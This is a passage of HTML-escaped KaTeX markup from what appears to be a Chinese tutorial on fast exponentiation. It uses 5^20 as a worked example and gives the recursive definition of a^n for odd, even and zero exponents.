&lt;p&gt;求解一个数的n次幂，如果只是将该数进行n此相乘，则需要进行n词运算，而使用快速幂则可以降低到logn。&lt;/p&gt;
&lt;p&gt;例如求&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;mn&gt;20&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;5^{20}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，首先拆分为&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;mrow&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mn&gt;10&lt;/mn&gt;&lt;/mrow&gt;&lt;/msup&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msup&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;mn&gt;10&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;msup&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;mn&gt;10&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;5^{2*10}=5^{10} * 5^{10}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，只需要求&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;mn&gt;10&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;5^{10}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;再乘上2，即一共11次运算；在此基础上再进行拆分为&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;msup&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;msup&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;msup&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;5^5*5^5*5^5*5^5&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，即一共9此运算，以此类推。&lt;/p&gt;
&lt;p&gt;因此快速幂实际上是一种二分的思想，可以写出一个递归方程，对于&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;a^n&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.664392em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.664392em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;n&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;：&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;/msup&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mrow&gt;&lt;mo fence=&#34;true&#34;&gt;{&lt;/mo&gt;&lt;mtable&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mstyle scriptlevel=&#34;0&#34; displaystyle=&#34;true&#34;&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;/msup&gt;&lt;mo&gt;×&lt;/mo&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;/mrow&gt;&lt;/mstyle&gt;&lt;/mtd&gt;&lt;mtd&gt;&lt;mstyle scriptlevel=&#34;0&#34; displaystyle=&#34;true&#34;&gt;&lt;mrow&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;/mstyle&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mstyle scriptlevel=&#34;0&#34; displaystyle=&#34;true&#34;&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mfrac&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/mfrac&gt;&lt;/msup&gt;&lt;mo&gt;×&lt;/mo&gt;&lt;msup&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mfrac&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/mfrac&gt;&lt;/msup&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;/mrow&gt;&lt;/mstyle&gt;&lt;/mtd&gt;&lt;mtd&gt;&lt;mstyle scriptlevel=&#34;0&#34; displaystyle=&#34;true&#34;&gt;&lt;mrow&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/mrow&gt;&lt;/mstyle&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mstyle scriptlevel=&#34;0&#34; displaystyle=&#34;true&#34;&gt;&lt;mrow&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;/mrow&gt;&lt;/mstyle&gt;&lt;/mtd&gt;&lt;mtd&gt;&lt;mstyle scriptlevel=&#34;0&#34; displaystyle=&#34;true&#34;&gt;&lt;mrow&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/mrow&gt;&lt;/mstyle&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;/mtable&gt;&lt;/mrow&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;a^n = \left \{ 
\begin{aligned}
a^{n-1} \times a, &amp;amp; \space if \space n \space is \space odd \\
a^{\frac{n}{2}} \times a^{\frac{n}{2}}, &amp;amp;  \space if  \space n \space is \space even  \space but  \space not 0 \\
1, &amp;amp; \space if \space n = 0
\end{aligned}
\right .
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.7143919999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.7143919999999999em;&#34;&gt;&lt;span style=&#34;top:-3.113em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;n&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:4.581188em;vertical-align:-2.040594em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;minner&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;&lt;span class=&#34;delimsizing mult&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:2.35002em;&#34;&gt;&lt;span style=&#34;top:-2.19999em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;delimsizinginner delim-size4&#34;&gt;&lt;span&gt;⎩&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-2.19999em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;delimsizinginner delim-size4&#34;&gt;&lt;span&gt;⎪&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.1500100000000004em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;delimsizinginner delim-size4&#34;&gt;&lt;span&gt;⎨&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-4.30001em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;delimsizinginner delim-size4&#34;&gt;&lt;span&gt;⎪&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-4.60002em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;delimsizinginner delim-size4&#34;&gt;&lt;span&gt;⎧&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.8500199999999998em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mtable&#34;&gt;&lt;span class=&#34;col-align-r&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:2.540594em;&#34;&gt;&lt;span style=&#34;top:-4.676486000000001em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.864108em;&#34;&gt;&lt;span style=&#34;top:-3.113em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;×&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.119406em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.89708em;&#34;&gt;&lt;span style=&#34;top:-3.4130000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mopen nulldelimiter sizing reset-size3 size6&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.6915428571428572em;&#34;&gt;&lt;span style=&#34;top:-2.656em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.2255000000000003em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line mtight&#34; style=&#34;border-bottom-width:0.049em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.384em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;n&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span 